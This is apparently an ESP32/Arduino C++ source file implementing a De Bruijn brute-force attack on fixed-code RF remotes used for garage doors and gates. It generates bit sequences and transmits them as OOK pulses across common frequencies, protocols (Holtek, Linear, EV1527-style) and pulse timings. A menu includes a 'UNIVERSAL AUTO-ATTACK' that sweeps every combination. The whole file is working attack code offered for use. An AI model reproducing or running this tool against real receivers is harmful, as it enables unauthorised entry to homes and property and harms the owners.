#include <Arduino.h>
#include <vector>
#include <map>

// --- INCLUDES DE PROTOCOLOS PARA EXACTITUD ---
#include "protocols/protocol.h"
#include "protocols/Holtek.h"
#include "protocols/EV1527.h"
#include "protocols/Linear.h"

// --- EXTERN DECLARATIONS ---
extern void dualPrintf(const char* format, ...);
extern void dualPrintln(String s);
extern void sendPulse(int duration);
extern void setFrequencyCorrected(float target_mhz);
extern char waitKey();
extern int checkPause();
extern int anyAvailable();
extern void clearBuffers();

// --- CLASE GENÉRICA PARA MODO UNIVERSAL ---
// Permite definir timings y ratios al vuelo
class protocol_dynamic : public c_rf_protocol {
public:
    protocol_dynamic(int te, int ratio = 3) {
        // ratio: 2 (1:2 for old PT2262), 3 (1:3 for EV1527/Standard)
        // Usamos positivo para HIGH, negativo para LOW
        // 0 = Short High, Long Low
        // 1 = Long High, Short Low
        
        int long_pulse = te * ratio;
        int short_pulse = te;
        
        // GENERIC OOK MAPPING
        transposition_table['0'] = {short_pulse, -long_pulse}; 
        transposition_table['1'] = {long_pulse, -short_pulse};
        
        // Pilot: Usually 1T High, 31T Low (Standard)
        pilot_period = {short_pulse, -te * 31}; 
        stop_bit = {};
    }
};

// --- CORE DE BRUIJN ---

std::vector<uint8_t> generateDeBruijn(int n) {
    std::vector<uint8_t> sequence;
    
    // [SEGURIDAD MEMORIA ESP32 PICO D4]
    // 16 bits = 65536 bytes de vector. 17 bits = 131KB (Peligro). 18 bits = CRASH.
    // Con Bluetooth activado, el heap libre ronda los 100-150KB.
    if (n > 16) {
        dualPrintln("[!] ERROR: >16 bits exceeds RAM.");
        return sequence;
    }

    int total_unique = 1 << n;
    uint8_t* visited = (uint8_t*)calloc(total_unique / 8 + 1, 1); 
    
    if (!visited) { dualPrintln("[!] Insufficient memory for De Bruijn."); return sequence; }

    // Preámbulo de ceros para llenar la ventana inicial
    for (int i=0; i < n; i++) sequence.push_back(0); 
    
    uint32_t mask = (1 << n) - 1;
    uint32_t val = 0;
    visited[0] |= 1; 
    
    // Algoritmo Greedy "Prefer Ones"
    for (int i = 0; i < total_unique - 1; i++) { 
        uint32_t next_one = ((val << 1) & mask) | 1;
        uint32_t next_zero = ((val << 1) & mask);
        
        bool one_visited = (visited[next_one / 8] >> (next_one % 8)) & 1;
        
        if (!one_visited) {
            val = next_one;
            visited[next_one / 8] |= (1 << (next_one % 8));
            sequence.push_back(1);
        } else {
            val = next_zero;
            visited[next_zero / 8] |= (1 << (next_zero % 8));
            sequence.push_back(0);
        }
    }
    
    free(visited);
    return sequence;
}

// Envía la secuencia usando EXACTAMENTE la definición del protocolo
void sendDeBruijnSequence(c_rf_protocol* proto, const std::vector<uint8_t>& db_seq, int repeats) {
    for (int r = 0; r < repeats; r++) {
        
        // 1. Enviar Piloto (si existe) al inicio de la secuencia/repetición
        // Esto ayuda a despertar al receptor o sincronizar el AGC
        for (int p : proto->pilot_period) sendPulse(p);

        // 2. Transmitir bits
        for (size_t i = 0; i < db_seq.size(); i++) {
            // Check pausar cada 256 bits para no bloquear
            if (i % 256 == 0) {
                 int status = checkPause();
                 if (status == 2) return; 
                 if (status == 1) break; 
                 yield(); 
            }

            char bitChar = db_seq[i] ? '1' : '0';
            
            // Usar la tabla de transposición EXACTA del protocolo
            if(proto->transposition_table.count(bitChar)) {
                const std::vector<int>& pulses = proto->transposition_table[bitChar];
                for (int t : pulses) sendPulse(t);
            }
        }

        // 3. Stop Bit (si existe) o pequeña pausa entre repeticiones
        if (!proto->stop_bit.empty()) {
             for (int s : proto->stop_bit) sendPulse(s);
        } else {
             sendPulse(-10000); // Pausa genérica si no hay stop definido
        }
    }
}

// Función principal de ejecución
void runDeBruijn(c_rf_protocol* proto, const char* name, int n, float freq, int repeats) {
    dualPrintf("\n[DeBruijn] Gen B(2, %d) para %s ... ", n, name);
    std::vector<uint8_t> seq = generateDeBruijn(n);
    if (seq.empty()) return;

    dualPrintf("Len: %d bits\n", (int)seq.size());
    
    dualPrintf("[DeBruijn] TX @ %.2f MHz | Reps: %d\n", freq, repeats);
    setFrequencyCorrected(freq);
    
    sendDeBruijnSequence(proto, seq, repeats);
    dualPrintln("[DeBruijn] Done.");
}

// --- MENÚS ---

void menuUniversalDeBruijn() {
    dualPrintln("\n==========================================");
    dualPrintln("   ULTIMATE UNIVERSAL DE BRUIJN SWEEP     ");
    dualPrintln("   [!] WARN: Rolling Code (HCS/Keeloq)    ");
    dualPrintln("       will NOT open (Only Fixed/Clones)  ");
    dualPrintln("==========================================");
    
    // 1. FREQUENCIES (Most common first)
    float freqs[] = {433.92, 315.00, 868.35, 300.00, 310.00, 318.00, 390.00, 433.42};
    
    // 2. TIMINGS (Pulse Width in us)
    int tes[] = {300, 200, 450}; 
    
    // 3. RATIOS (PWM Pulse Relationship)
    // 3 = 1:3 (EV1527 Standard)
    // 2 = 1:2 (Old PT2262 / SMC)
    int ratios[] = {3, 2};
    
    // 3. BITS (Lengths)
    int bits[] = {12, 10}; // Removed 8 to save time with new ratio loop

    int total_configs = sizeof(freqs)/sizeof(float) * sizeof(tes)/sizeof(int) * sizeof(ratios)/sizeof(int) * sizeof(bits)/sizeof(int);
    int current_config = 0;

    for (float f : freqs) {
        for (int b : bits) {
            for (int t : tes) {
                for (int r : ratios) {
                    current_config++;
                    int status = checkPause();
                    if (status == 2) { dualPrintln("[!] Universal Attack CANCELLED."); return; }
                    if (status == 1) continue; // Skip
    
                    // Progress Info
                    dualPrintf("\n[%d/%d] Freq: %.2f | Bits: %d | Te: %dus | Ratio 1:%d\n", current_config, total_configs, f, b, t, r);
                    
                    // Configure generic protocol with current timing AND ratio
                    protocol_dynamic dynProto(t, r); 
                    
                    // Run De Bruijn (Repeats reduced to 3 for speed)
                    std::vector<uint8_t> seq = generateDeBruijn(b);
                    if (seq.empty()) continue; // Skip if generation failed (memory)
                    
                    setFrequencyCorrected(f);
                    sendDeBruijnSequence(&dynProto, seq, 3); 
                    
                    yield(); // Prevent watchdog crash
                }
            }
        }
    }
    dualPrintln("\n[UNIVERSAL] Full Sweep Complete.");
}

void menuDeBruijn() {
    while(true) {
        dualPrintln("\n=== DE BRUIJN ATTACK (EXACT TIMING) ===");
        dualPrintln("1. Generic 12-bit (433.92 MHz, Te=300us) [EV1527 Style]");
        dualPrintln("2. Generic 12-bit (315.00 MHz, Te=300us)");
        dualPrintln("3. Holtek 12-bit (433.92 MHz) [EXACT]");
        dualPrintln("4. Linear 10-bit (300.00 MHz) [EXACT]");
        dualPrintln("9. UNIVERSAL AUTO-ATTACK (All Combos)");
        dualPrintln("B. Back");
        
        char c = waitKey();
        if (c == 'B' || c == 'b') return;
        
        if (c == '1') {
            protocol_dynamic p(300);
            runDeBruijn(&p, "Generic 433", 12, 433.92, 5);
        }
        if (c == '2') {
            protocol_dynamic p(300);
            runDeBruijn(&p, "Generic 315", 12, 315.00, 5);
        }
        if (c == '3') {
            // Aquí usamos la clase REAL de Holtek para usar sus timings exactos
            protocol_holtek p; 
            runDeBruijn(&p, "Holtek", 12, 433.92, 5);
        }
        if (c == '4') {
            protocol_linear p;
            runDeBruijn(&p, "Linear", 10, 300.00, 5);
        }
        
        if (c == '9') menuUniversalDeBruijn();
    }
}
